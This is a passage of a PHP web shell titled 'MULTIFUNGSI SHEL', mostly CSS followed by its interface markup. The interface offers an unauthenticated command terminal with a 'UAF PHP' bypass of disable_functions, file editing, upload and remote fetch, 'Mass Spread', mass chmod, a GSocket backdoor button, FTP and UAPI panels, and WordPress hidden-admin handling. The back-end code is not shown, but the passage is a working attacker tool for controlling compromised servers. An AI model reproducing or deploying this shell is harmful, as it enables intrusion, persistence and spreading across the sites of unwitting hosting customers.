    text-decoration: none;
    transition: color 0.2s;
}
.breadcrumb a:hover { color: var(--accent-gold); }
.breadcrumb .sep { color: var(--text-muted); }

.dashboard-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
    margin-bottom: 16px;
}

@media (max-width: 992px) {
    .dashboard-grid { grid-template-columns: 1fr; }
}

.card {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 16px 18px;
    transition: all 0.3s ease;
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
}
.card:hover {
    border-color: var(--border-light);
    box-shadow: var(--shadow-glow);
}

.card-title {
    font-size: 11px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: var(--text-muted);
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.card-title .icon {
    font-size: 16px;
}

.terminal-card {
    grid-column: 1 / -1;
}

.cmd-prompt {
    display: flex;
    align-items: center;
    gap: 10px;
    background: var(--bg-input);
    border: 1px solid var(--border-color);
    border-radius: 10px;
    padding: 8px 14px;
    transition: border-color 0.3s;
}
.cmd-prompt:focus-within { border-color: var(--accent-blue); }

.cmd-user {
    color: var(--accent-green);
    font-size: 12px;
    font-weight: 600;
    font-family: 'JetBrains Mono', monospace;
    white-space: nowrap;
}
.cmd-dollar {
    color: var(--accent-gold);
    font-weight: 700;
    font-size: 15px;
}
.cmd-prompt input {
    flex: 1;
    background: transparent;
    border: none;
    color: var(--text-primary);
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    outline: none;
    padding: 6px 0;
}
.cmd-prompt input::placeholder { color: var(--text-muted); }

.cmd-actions {
    display: flex;
    gap: 6px;
    align-items: center;
}

.cmd-output {
    background: rgba(5, 10, 24, 0.9);
    border: 1px solid var(--border-color);
    border-radius: 10px;
    padding: 14px 16px;
    margin-top: 12px;
    max-height: 300px;
    overflow-y: auto;
}
.cmd-output pre {
    color: #4ade80;
    font-size: 11px;
    white-space: pre-wrap;
    word-wrap: break-word;
    font-family: 'JetBrains Mono', monospace;
    margin: 0;
    line-height: 1.7;
}

.tools-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 8px;
}

.tool-btn {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 8px 14px;
    border-radius: 8px;
    font-size: 11px;
    font-weight: 600;
    border: 1px solid var(--border-color);
    cursor: pointer;
    transition: all 0.25s ease;
    font-family: inherit;
    background: var(--bg-input);
    color: var(--text-primary);
    text-decoration: none;
    width: 100%;
    justify-content: center;
}
.tool-btn:hover {
    transform: translateY(-2px);
    border-color: var(--accent-blue);
    box-shadow: 0 6px 20px rgba(74, 158, 255, 0.12);
}
.tool-btn .emoji { font-size: 15px; }

.tool-btn.primary { background: var(--gradient-gold); color: #000; border-color: var(--accent-gold); }
.tool-btn.primary:hover { box-shadow: 0 6px 25px rgba(240, 185, 11, 0.3); }

.tool-btn.blue { background: var(--gradient-blue); color: #fff; border-color: #2563eb; }
.tool-btn.blue:hover { box-shadow: 0 6px 25px rgba(37, 99, 235, 0.3); }

.tool-btn.purple { background: var(--gradient-purple); color: #fff; border-color: #7c3aed; }
.tool-btn.purple:hover { box-shadow: 0 6px 25px rgba(124, 58, 237, 0.3); }

.tool-btn.pink { background: var(--gradient-pink); color: #fff; border-color: #db2777; }
.tool-btn.pink:hover { box-shadow: 0 6px 25px rgba(219, 39, 119, 0.3); }

.tool-btn.cyan { background: var(--gradient-cyan); color: #fff; border-color: #0891b2; }
.tool-btn.cyan:hover { box-shadow: 0 6px 25px rgba(6, 182, 212, 0.3); }

.tool-btn.orange { background: linear-gradient(135deg, #f97316, #ea580c); color: #fff; border-color: #ea580c; }
.tool-btn.orange:hover { box-shadow: 0 6px 25px rgba(249, 115, 22, 0.3); }

.tool-btn.green { background: linear-gradient(135deg, #10b981, #059669); color: #fff; border-color: #059669; }
.tool-btn.green:hover { box-shadow: 0 6px 25px rgba(16, 185, 129, 0.3); }

.tool-btn.red { background: linear-gradient(135deg, #f85149, #dc2626); color: #fff; border-color: #dc2626; }
.tool-btn.red:hover { box-shadow: 0 6px 25px rgba(220, 38, 38, 0.3); }

.file-table-wrap {
    border-radius: 12px;
    overflow: hidden;
    border: 1px solid var(--border-color);
}

.file-table {
    width: 100%;
    border-collapse: collapse;
    background: var(--bg-card);
}

.file-table thead th {
    background: rgba(240, 185, 11, 0.04);
    color: var(--accent-gold);
    font-size: 9px;
    text-transform: uppercase;
    padding: 10px 16px;
    text-align: left;
    font-weight: 700;
    letter-spacing: 0.6px;
    border-bottom: 1px solid var(--border-color);
}

.file-table tbody td {
    padding: 8px 16px;
    border-bottom: 1px solid rgba(42, 58, 90, 0.3);
    font-size: 12px;
    color: var(--text-primary);
}
.file-table tbody tr:last-child td { border-bottom: none; }
.file-table tbody tr:hover { background: rgba(74, 158, 255, 0.03); }

.file-table td a {
    color: var(--accent-blue);
    text-decoration: none;
    transition: color 0.2s;
}
.file-table td a:hover { color: var(--accent-gold); }

.file-icon { display: inline-flex; align-items: center; gap: 8px; }
.folder-icon { color: var(--accent-gold); }
.file-icon-type { color: var(--accent-blue); }

.action-btns { display: flex; gap: 4px; flex-wrap: wrap; justify-content: flex-end; }
.action-btns a {
    padding: 3px 10px;
    font-size: 10px;
    border-radius: 4px;
    text-decoration: none;
    border: 1px solid var(--border-color);
    color: var(--text-secondary);
    transition: all 0.2s;
}
.action-btns a:hover {
    border-color: var(--accent-blue);
    color: var(--text-primary);
    background: var(--bg-input);
}
.action-btns a.act-del {
    border-color: rgba(248, 81, 73, 0.25);
    color: var(--accent-red);
}
.action-btns a.act-del:hover {
    background: var(--accent-red);
    color: white;
    border-color: var(--accent-red);
}

.upload-row {
    display: flex;
    gap: 8px;
    align-items: center;
    flex-wrap: wrap;
}

.custom-file-input {
    flex: 1;
    display: flex;
    align-items: center;
    gap: 10px;
    background: var(--bg-input);
    border: 1px solid var(--border-color);
    border-radius: 8px;
    padding: 6px 12px;
    cursor: pointer;
    transition: all 0.25s;
    min-width: 180px;
}
.custom-file-input:hover { border-color: var(--accent-blue); }
.custom-file-input input[type="file"] { display: none; }
.custom-file-input .file-btn {
    display: flex;
    align-items: center;
    gap: 6px;
    background: var(--gradient-blue);
    color: white;
    padding: 4px 14px;
    border-radius: 6px;
    font-size: 11px;
    font-weight: 500;
    white-space: nowrap;
}
.custom-file-input .file-name {
    font-size: 11px;
    color: var(--text-secondary);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    flex: 1;
}
.custom-file-input.has-file .file-name { color: var(--accent-gold); }

.modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.85);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    animation: modalFadeIn 0.25s ease;
}

@keyframes modalFadeIn {
    from { opacity: 0; transform: scale(0.95); }
    to { opacity: 1; transform: scale(1); }
}

.modal {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 16px;
    max-width: 620px;
    width: 94%;
    max-height: 92vh;
    overflow: hidden;
    box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
}

.modal-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 22px;
    border-bottom: 1px solid var(--border-color);
    background: var(--bg-secondary);
}
.modal-title {
    font-weight: 700;
    font-size: 15px;
    color: var(--text-primary);
    display: flex;
    align-items: center;
    gap: 10px;
}
.modal-close {
    background: none;
    border: none;
    color: var(--text-muted);
    cursor: pointer;
    padding: 4px;
    border-radius: 6px;
    transition: all 0.2s;
}
.modal-close:hover { background: rgba(248, 81, 73, 0.15); color: var(--accent-red); }
.modal-body { padding: 20px 22px; max-height: 70vh; overflow-y: auto; }
.modal-footer {
    padding: 14px 22px;
    border-top: 1px solid var(--border-color);
    display: flex;
    justify-content: flex-end;
    gap: 8px;
    background: var(--bg-secondary);
}

.form-group { margin-bottom: 14px; }
.form-label {
    display: block;
    font-size: 11px;
    color: var(--text-secondary);
    margin-bottom: 4px;
    font-weight: 500;
}
.form-input {
    width: 100%;
    background: var(--bg-input);
    border: 1px solid var(--border-color);
    color: var(--text-primary);
    padding: 8px 14px;
    border-radius: 8px;
    font-family: inherit;
    font-size: 12px;
    outline: none;
    transition: all 0.3s;
}
.form-input:focus {
    border-color: var(--accent-blue);
    box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.08);
}
.form-input::placeholder { color: var(--text-muted); }

.btn {
    padding: 6px 16px;
    border-radius: 8px;
    font-size: 11px;
    font-weight: 600;
    border: 1px solid var(--border-color);
    cursor: pointer;
    transition: all 0.25s ease;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-family: inherit;
    text-decoration: none;
    color: var(--text-primary);
    background: var(--bg-input);
}
.btn:hover {
    transform: translateY(-1px);
    border-color: var(--accent-blue);
    box-shadow: 0 4px 20px rgba(74, 158, 255, 0.12);
}
.btn-sm { padding: 4px 12px; font-size: 10px; border-radius: 6px; }

.btn-primary {
    background: var(--gradient-gold);
    color: #000;
    border-color: var(--accent-gold);
    font-weight: 700;
}
.btn-primary:hover { box-shadow: 0 4px 25px rgba(240, 185, 11, 0.3); }

.btn-secondary { background: var(--bg-input); color: var(--text-primary); border-color: var(--border-color); }

.btn-danger {
    background: rgba(248, 81, 73, 0.12);
    color: var(--accent-red);
    border-color: rgba(248, 81, 73, 0.25);
}
.btn-danger:hover { background: var(--accent-red); color: white; border-color: var(--accent-red); }

.btn-success {
    background: rgba(63, 185, 80, 0.12);
    color: var(--accent-green);
    border-color: rgba(63, 185, 80, 0.25);
}
.btn-success:hover { background: var(--accent-green); color: #000; border-color: var(--accent-green); }

.wp-user-row {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 14px;
    background: var(--bg-secondary);
    border: 1px solid var(--border-color);
    border-radius: 8px;
    margin-bottom: 4px;
    transition: border-color 0.2s;
}
.wp-user-row:hover { border-color: var(--accent-blue); }
.wp-user-row.wp-hidden {
    background: rgba(59, 130, 246, 0.05);
    border-color: rgba(59, 130, 246, 0.2);
}
.wp-badge {
    display: inline-block;
    padding: 1px 10px;
    border-radius: 4px;
    font-size: 9px;
    font-weight: 700;
    text-transform: uppercase;
}
.wp-badge-hidden { background: #7c3aed; color: white; }
.wp-badge-admin { background: var(--accent-gold); color: #000; }

.proc-row:hover { background: rgba(236, 72, 153, 0.03) !important; }
.proc-hidden { border-left: 3px solid var(--accent-red) !important; background: rgba(248, 81, 73, 0.04) !important; }
.proc-recent { border-left: 3px solid var(--accent-green) !important; background: rgba(63, 185, 80, 0.04) !important; }
.proc-high-cpu { color: var(--accent-red) !important; font-weight: 700; }
.proc-high-mem { color: var(--accent-orange) !important; font-weight: 700; }

.msg-success {
    background: rgba(63, 185, 80, 0.08);
    border: 1px solid rgba(63, 185, 80, 0.2);
    color: var(--accent-green);
    padding: 10px 16px;
    border-radius: 8px;
    font-size: 12px;
    margin-bottom: 12px;
}
.msg-error {
    background: rgba(248, 81, 73, 0.08);
    border: 1px solid rgba(248, 81, 73, 0.2);
    color: var(--accent-red);
    padding: 10px 16px;
    border-radius: 8px;
    font-size: 12px;
    margin-bottom: 12px;
}

.rename-preview {
    background: var(--bg-secondary);
    border: 1px solid var(--border-color);
    border-radius: 8px;
    padding: 16px;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
    flex-wrap: wrap;
}
.rename-preview .old-name {
    color: var(--accent-red);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    word-break: break-all;
}
.rename-preview .arrow {
    color: var(--text-muted);
    font-size: 18px;
}
.rename-preview .new-name {
    color: var(--accent-green);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    font-weight: 700;
    word-break: break-all;
}
.rename-preview .file-icon-big {
    font-size: 32px;
}
.rename-input-wrap {
    display: flex;
    gap: 8px;
    align-items: center;
    background: var(--bg-input);
    border: 2px solid var(--border-color);
    border-radius: 10px;
    padding: 4px 4px 4px 14px;
    transition: border-color 0.3s;
}
.rename-input-wrap:focus-within {
    border-color: var(--accent-blue);
}
.rename-input-wrap .rename-label {
    color: var(--text-muted);
    font-size: 11px;
    font-weight: 600;
    white-space: nowrap;
}
.rename-input-wrap input {
    flex: 1;
    background: transparent;
    border: none;
    color: var(--text-primary);
    font-family: 'JetBrains Mono', monospace;
    font-size: 13px;
    outline: none;
    padding: 8px 0;
    min-width: 120px;
}
.rename-input-wrap input::placeholder {
    color: var(--text-muted);
}
.rename-input-wrap .rename-ext {
    color: var(--text-muted);
    font-size: 12px;
    font-weight: 500;
    padding-right: 8px;
}

.app-footer {
    background: var(--glass-bg);
    backdrop-filter: blur(20px);
    border-top: 1px solid var(--border-color);
    padding: 14px 24px;
    text-align: center;
    margin-top: 20px;
}
.footer-content {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 14px;
}
.footer-avatar {
    width: 36px;
    height: 36px;
    border-radius: 50%;
    border: 2px solid var(--accent-gold);
    object-fit: cover;
}
.footer-text {
    font-size: 11px;
    color: var(--text-secondary);
}
.footer-text span {
    color: var(--accent-gold);
    font-weight: 700;
}

@media (max-width: 768px) {
    .app-header { padding: 10px 16px; flex-wrap: wrap; gap: 8px; }
    .header-title { font-size: 20px; }
    .header-right { flex-wrap: wrap; }
    .sys-badge { font-size: 9px; padding: 3px 10px; }
    .container { padding: 10px 12px; }
    .dashboard-grid { gap: 10px; }
    .card { padding: 12px 14px; }
    .tools-grid { grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); }
    .file-table thead th { font-size: 8px; padding: 6px 10px; }
    .file-table tbody td { font-size: 11px; padding: 6px 10px; }
    .modal { width: 96%; }
    .upload-row { flex-direction: column; }
    .custom-file-input { width: 100%; }
    .rename-preview { flex-direction: column; text-align: center; }
    .rename-preview .arrow { transform: rotate(90deg); }
}

.hidden { display: none !important; }
.text-gold { color: var(--accent-gold); }
.text-blue { color: var(--accent-blue); }
.text-green { color: var(--accent-green); }
.text-red { color: var(--accent-red); }
.text-muted { color: var(--text-muted); }
.flex { display: flex; }
.flex-center { display: flex; align-items: center; gap: 6px; }
.gap-1 { gap: 4px; }
.gap-2 { gap: 8px; }
.gap-3 { gap: 12px; }
.mb-1 { margin-bottom: 6px; }
.mb-2 { margin-bottom: 10px; }
.mt-1 { margin-top: 6px; }
.w-full { width: 100%; }
</style>
</head>
<body>

<?php if (isset($_GET['edit'])): ?>
<div class="container">
    <div style="margin-bottom: 12px;">
        <a href="?lph=<?php echo urlencode(dirname($_GET['edit'])); ?>" class="btn btn-secondary">&larr; Back</a>
    </div>
    <div class="card">
        <div class="card-title"><span class="icon">✎</span> Editing: <?php echo htmlspecialchars(basename($file)); ?></div>
        <?php if (!empty($responseMessage)): ?><div class="msg-success">✓ <?php echo $responseMessage; ?></div><?php endif; ?>
        <?php if (!empty($errorMessage)): ?><div class="msg-error">✗ <?php echo $errorMessage; ?></div><?php endif; ?>
        <form method="POST">
            <textarea name="content" class="form-input" style="min-height:450px;font-family:'JetBrains Mono',monospace;font-size:12px;resize:vertical;tab-size:4;"><?php echo htmlspecialchars($content ?? ''); ?></textarea>
            <div style="margin-top:12px;display:flex;gap:10px;">
                <button type="submit" class="btn btn-primary">💾 Save</button>
                <a href="?lph=<?php echo urlencode(dirname($file)); ?>" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php elseif (isset($_GET['rename'])): ?>
<?php 
$renameFile = $_GET['rename'];
$oldName = basename($renameFile);
$oldNameNoExt = pathinfo($oldName, PATHINFO_FILENAME);
$oldExt = pathinfo($oldName, PATHINFO_EXTENSION);
$isDir = is_dir($renameFile);
$icon = $isDir ? '📁' : '📄';
$typeLabel = $isDir ? 'Folder' : 'File';
?>
<div class="container" style="max-width:600px;margin:40px auto;">
    <div class="card" style="border-color:var(--accent-blue);">
        <div class="card-title"><span class="icon">✏️</span> Rename <?php echo $typeLabel; ?></div>
        
        <?php if (!empty($errorMessage)): ?>
        <div class="msg-error">✗ <?php echo $errorMessage; ?></div>
        <?php endif; ?>
        
        <div class="rename-preview">
            <div style="display:flex;align-items:center;gap:12px;">
                <span class="file-icon-big"><?php echo $icon; ?></span>
                <div>
                    <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;">Current Name</div>
                    <div class="old-name"><?php echo htmlspecialchars($oldName); ?></div>
                </div>
            </div>
            <div class="arrow">➜</div>
            <div style="display:flex;align-items:center;gap:12px;">
                <div>
                    <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;">New Name</div>
                    <div class="new-name" id="previewNewName"><?php echo htmlspecialchars($oldName); ?></div>
                </div>
            </div>
        </div>
        
        <form method="POST" id="renameForm">
            <div class="form-group">
                <label class="form-label">Enter New Name</label>
                <div class="rename-input-wrap">
                    <span class="rename-label">📎</span>
                    <input type="text" name="new_name" id="renameInput" 
                           value="<?php echo htmlspecialchars($oldName); ?>" 
                           placeholder="Enter new name..." 
                           autofocus required
                           oninput="updateRenamePreview(this.value, '<?php echo addslashes($oldName); ?>')">
                    <?php if ($oldExt && !$isDir): ?>
                    <span class="rename-ext">.<?php echo htmlspecialchars($oldExt); ?></span>
                    <?php endif; ?>
                </div>
                <div style="margin-top:6px;font-size:10px;color:var(--text-muted);">
                    💡 Tip: Enter the full new name including extension (e.g., <span style="color:var(--accent-gold);">newfile.php</span>)
                </div>
            </div>
            
            <div style="display:flex;gap:10px;margin-top:16px;">
                <button type="submit" class="btn btn-primary" style="flex:1;justify-content:center;padding:10px;">
                    ✅ Rename
                </button>
                <a href="?lph=<?php echo urlencode(dirname($renameFile)); ?>" class="btn btn-secondary" style="flex:1;justify-content:center;text-align:center;padding:10px;">
                    Cancel
                </a>
            </div>
        </form>
        
        <div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border-color);">
            <div style="font-size:10px;color:var(--text-muted);">
                📂 Location: <?php echo htmlspecialchars(dirname($renameFile)); ?>
            </div>
        </div>
    </div>
</div>

<script>
function updateRenamePreview(newName, oldName) {
    var preview = document.getElementById('previewNewName');
    if (preview) {
        preview.textContent = newName || oldName;
        if (!newName.trim()) {
            preview.textContent = 'Enter new name...';
            preview.style.color = 'var(--text-muted)';
            preview.style.fontWeight = '400';
        } else {
            preview.style.color = '';
            preview.style.fontWeight = '700';
        }
    }
}
</script>

<?php elseif (isset($_GET['chmod'])): ?>
<div class="container">
    <div class="card">
        <div class="card-title"><span class="icon">🔒</span> Chmod: <?php echo htmlspecialchars(basename($_GET['chmod'])); ?></div>
        <form method="POST">
            <div class="form-group">
                <label class="form-label">Permission (octal)</label>
                <input type="text" name="permission" class="form-input" placeholder="0755" maxlength="4" required>
            </div>
            <div style="display:flex;gap:10px;">
                <button type="submit" class="btn btn-primary">Apply</button>
                <a href="?lph=<?php echo urlencode(dirname($_GET['chmod'])); ?>" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php else: ?>

<header class="app-header">
    <div class="header-left">
        <div class="header-title-group">
            <div class="header-title">MULTIFUNGSI SHEL</div>
            <div class="header-sub">Kunjet</div>
        </div>
    </div>
    <div class="header-right">
        <span class="sys-badge"><span class="dot green"></span> <?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
        <span class="sys-badge"><span class="dot blue"></span> <?php echo @get_current_user(); ?></span>
        <span class="sys-badge" style="border-color:var(--accent-green);color:var(--accent-green);">🔓 No Auth</span>
        <a href="?logout=1" class="btn btn-sm btn-danger" style="padding:4px 12px;font-size:10px;">🚪 Logout</a>
    </div>
</header>

<div class="container">
    <?php if (!empty($responseMessage)): ?>
    <div class="msg-success">✓ <?php echo $responseMessage; ?></div>
    <?php endif; ?>
    <?php if (!empty($errorMessage)): ?>
    <div class="msg-error">✗ <?php echo $errorMessage; ?></div>
    <?php endif; ?>

    <div class="breadcrumb">
        <span class="label">📂 Path</span>
        <?php
        $bPath = str_replace('\\', '/', $currentDirectory);
        $parts = explode('/', $bPath);
        foreach ($parts as $id => $part) {
            if ($part == '' && $id == 0) {
                echo ' <a href="?lph=/">/</a>';
            } elseif (!empty($part)) {
                $link = implode('/', array_slice($parts, 0, $id + 1));
                echo ' <span class="sep">/</span> <a href="?lph=' . urlencode($link) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        ?>
    </div>

    <div class="dashboard-grid">

        <div class="card terminal-card">
            <div class="card-title"><span class="icon">⌨️</span> Terminal</div>
            <form method="POST" id="cmdForm">
                <input type="hidden" name="use_bypass" id="useBypassField" value="0">
                <div class="cmd-prompt">
                    <span class="cmd-user"><?php echo @get_current_user() . '@' . @gethostname(); ?></span>
                    <span class="cmd-dollar" id="cmdModeLabel">$</span>
                    <input type="text" name="cmd" placeholder="Enter command..." autofocus>
                    <div class="cmd-actions">
                        <button type="submit" class="btn btn-primary btn-sm">▶ Run</button>
                        <button type="button" id="bypassToggle" class="btn btn-secondary btn-sm" onclick="toggleBypass()" style="padding:4px 10px;font-size:9px;min-width:56px;">Normal</button>
                    </div>
                </div>
            </form>
            <?php
            $disabledFuncs = @ini_get('disable_functions');
            $execAvailable = !$disabledFuncs || (
                stripos($disabledFuncs, 'exec') === false &&
                stripos($disabledFuncs, 'shell_exec') === false &&
                stripos($disabledFuncs, 'proc_open') === false &&
                stripos($disabledFuncs, 'system') === false
            );
            ?>
            <div style="display:flex;gap:12px;align-items:center;margin-top:8px;padding:0 4px;flex-wrap:wrap;">
                <span style="font-size:10px;color:var(--text-muted);">Exec:</span>
                <span style="font-size:10px;color:<?php echo $execAvailable ? 'var(--accent-green)' : 'var(--accent-red)'; ?>;font-weight:600;"><?php echo $execAvailable ? '✓ Available' : '✗ Disabled'; ?></span>
                <span style="color:var(--text-muted);">|</span>
                <span style="font-size:10px;color:var(--text-muted);">Bypass:</span>
                <span style="font-size:10px;color:var(--accent-blue);font-weight:600;">UAF PHP <?php echo PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION; ?></span>
                <span style="color:var(--text-muted);">|</span>
                <span style="font-size:10px;color:var(--text-muted);">Disabled:</span>
                <span style="font-size:10px;color:var(--accent-orange);max-width:350px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="<?php echo htmlspecialchars($disabledFuncs); ?>"><?php echo $disabledFuncs ? htmlspecialchars(substr($disabledFuncs, 0, 60)) . (strlen($disabledFuncs) > 60 ? '…' : '') : 'None'; ?></span>
            </div>
            <?php if (!empty($cmdOutput)): ?>
            <div class="cmd-output"><pre><?php echo htmlspecialchars($cmdOutput); ?></pre></div>
            <?php endif; ?>
        </div>

        <div class="card">
            <div class="card-title"><span class="icon">⬆</span> Upload &amp; Extract</div>
            <div style="display:flex;flex-direction:column;gap:10px;">
                <form method="POST" enctype="multipart/form-data">
                    <div class="upload-row">
                        <label class="custom-file-input">
                            <input type="file" name="file" onchange="updateFileName(this)">
                            <span class="file-btn">📄 Choose</span>
                            <span class="file-name">No file selected</span>
                        </label>
                        <button type="submit" name="upload" class="btn btn-primary btn-sm">Upload</button>
                    </div>
                </form>
                <form method="POST" enctype="multipart/form-data" style="display:flex;gap:8px;flex-wrap:wrap;">
                    <label class="custom-file-input" style="flex:2;min-width:150px;">
                        <input type="file" name="zip_file" accept=".zip" onchange="updateZipName(this)">
                        <span class="file-btn">📦 ZIP</span>
                        <span class="file-name" id="zipFileName">Choose ZIP to extract</span>
                    </label>
                    <button type="submit" name="extract_zip_upload" class="btn btn-success btn-sm">Extract</button>
                </form>
                <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:2px;">
                    <button onclick="showModal('multiupload')" class="tool-btn" style="flex:1;min-width:100px;">📤 Multi Upload</button>
                    <button onclick="showModal('remote')" class="tool-btn" style="flex:1;min-width:100px;">🌐 Remote</button>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-title"><span class="icon">🛠️</span> Tools</div>
            <div class="tools-grid">
                <form method="POST" style="width:100%;">
                    <button type="submit" name="scan_deeply" class="tool-btn cyan">🔎 Deep Scan</button>
                </form>
                <form method="POST" style="width:100%;">
                    <input type="hidden" name="scan_ext" value="php">
                    <button type="submit" name="scan_newly" class="tool-btn cyan">📄 New PHP</button>
                </form>
                <button onclick="showModal('chmod')" class="tool-btn pink">🔒 Mass Chmod</button>
                <button onclick="showModal('spread')" class="tool-btn orange">🌊 Mass Spread</button>
                <button onclick="showModal('gsocket')" class="tool-btn green">🌐 GSSocket</button>
                <button onclick="showModal('uapi')" class="tool-btn purple">🛡 UAPI</button>
                <button onclick="showModal('ftp')" class="tool-btn" style="background:linear-gradient(135deg,#f97316,#ea580c);color:#fff;border-color:#ea580c;">📡 FTP</button>
                <?php if ($wpAvailable): ?>
                <button onclick="showModal('wp')" class="tool-btn blue">📰 WordPress</button>
                <?php endif; ?>
                <button onclick="showModal('proc')" class="tool-btn pink">⚡ Process</button>
                <form method="POST" style="width:100%;">
                </form>
            </div>
        </div>

        <div class="card">
            <div class="card-title"><span class="icon"></span> Quick Actions</div>
            <div style="display:flex;flex-wrap:wrap;gap:8px;">
                <form method="POST" style="display:contents;">
                    <button type="submit" name="newfolder_btn" class="btn btn-secondary btn-sm" onclick="var n=prompt('Folder name:');if(n){this.form.querySelector('[name=foldername]').value=n;}else{event.preventDefault();}">
                        📁 New Folder
                    </button>
                    <input type="hidden" name="newfolder" value="1">
                    <input type="hidden" name="foldername" value="">
                </form>
                <form method="POST" style="display:contents;" onsubmit="var f=prompt('File name:');if(f){this.querySelector('[name=newfilename]').value=f;}else{event.preventDefault();}">
                    <button type="submit" name="newfile_btn" class="btn btn-secondary btn-sm">
                        📄 New File
                    </button>
                    <input type="hidden" name="newfile" value="1">
                    <input type="hidden" name="newfilename" value="">
                </form>
                <button onclick="showModal('chmod')" class="btn btn-secondary btn-sm">🔒 Chmod</button>
            </div>
        </div>

    </div>

    <div class="file-table-wrap">
        <table class="file-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th style="text-align:right;">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $fileDetails = getFileDetails($currentDirectory);
                if (is_array($fileDetails)):
                    foreach ($fileDetails as $fd):
                        $fullPath = $currentDirectory . '/' . $fd['name'];
                        $fileExt = pathinfo($fd['name'], PATHINFO_EXTENSION);
                        $isArchive = in_array(strtolower($fileExt), ['zip', 'tar', 'gz', 'bz2', 'rar', '7z', 'tgz', 'tbz', 'xz', 'txz']);
                ?>
                <tr>
                    <td>
                        <span class="file-icon">
                            <?php if ($fd['type'] === 'Folder'): ?>
                            <span class="folder-icon">📁</span>
                            <a href="?lph=<?php echo urlencode($fullPath); ?>" style="color:var(--accent-gold);"><?php echo htmlspecialchars($fd['name']); ?></a>
                            <?php else: ?>
                            <span class="file-icon-type">📄</span>
                            <a href="?edit=<?php echo urlencode($fullPath); ?>" style="color:var(--text-primary);"><?php echo htmlspecialchars($fd['name']); ?></a>
                            <?php endif; ?>
                        </span>
                    </td>
                    <td style="color:var(--text-secondary);font-size:11px;"><?php echo $fd['type']; ?></td>
                    <td style="color:var(--text-secondary);font-size:11px;"><?php echo $fd['size']; ?></td>
                    <td style="color:<?php echo $fd['perm_color']; ?>;font-family:'JetBrains Mono',monospace;font-weight:600;font-size:11px;"><?php echo $fd['permission']; ?></td>
                    <td style="text-align:right;">
                        <div class="action-btns">
                            <?php if ($fd['type'] === 'File'): ?>
                            <a href="?edit=<?php echo urlencode($fullPath); ?>">✎</a>
                            <a href="javascript:void(0)" onclick="window.open('<?php echo htmlspecialchars($fullPath); ?>','_blank')" style="border-color:rgba(74,158,255,0.3);color:var(--accent-blue);">🔗</a>
                            <?php if ($isArchive): ?>
                            <a href="javascript:void(0)" onclick="extractFile('<?php echo urlencode($fullPath); ?>','<?php echo urlencode($currentDirectory); ?>')" style="border-color:rgba(20,184,166,0.3);color:#14b8a6;">📦</a>
                            <?php endif; ?>
                            <?php endif; ?>
                            <a href="?rename=<?php echo urlencode($fullPath); ?>" style="border-color:rgba(74,158,255,0.3);color:var(--accent-blue);">✏️</a>
                            <a href="?chmod=<?php echo urlencode($fullPath); ?>">🔒</a>
                            <a href="javascript:void(0)" class="act-del" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>','<?php echo htmlspecialchars($fd['name']); ?>')">🗑</a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; else: ?>
                <tr><td colspan="5" style="color:var(--text-muted);padding:30px;text-align:center;">No files or folders found.</td></tr>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
</div>

<footer class="app-footer">
    <div class="footer-content">
        <img src="https://ik.imagekit.io/nehadee/backgroud%20bajakteam168%20ke2.jpg?updatedAt=1786398988852" class="footer-avatar" alt="">
        <div class="footer-text">⚠️<span>UPGRADE YOUR LIFE IN SILENT</span>⚠️</div>
    </div>
</footer>

<div class="modal-overlay hidden" id="deleteConfirmModal">
    <div class="modal" style="max-width:400px;">
        <div class="modal-header" style="border-bottom-color:rgba(248,81,73,0.3);">
            <span class="modal-title" style="color:var(--accent-red);">⚠️ Delete</span>
            <button class="modal-close" onclick="hideDeleteConfirm()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="text-align:center;padding:28px;">
            <div style="width:64px;height:64px;background:rgba(248,81,73,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;">
                <span style="font-size:28px;">🗑</span>
            </div>
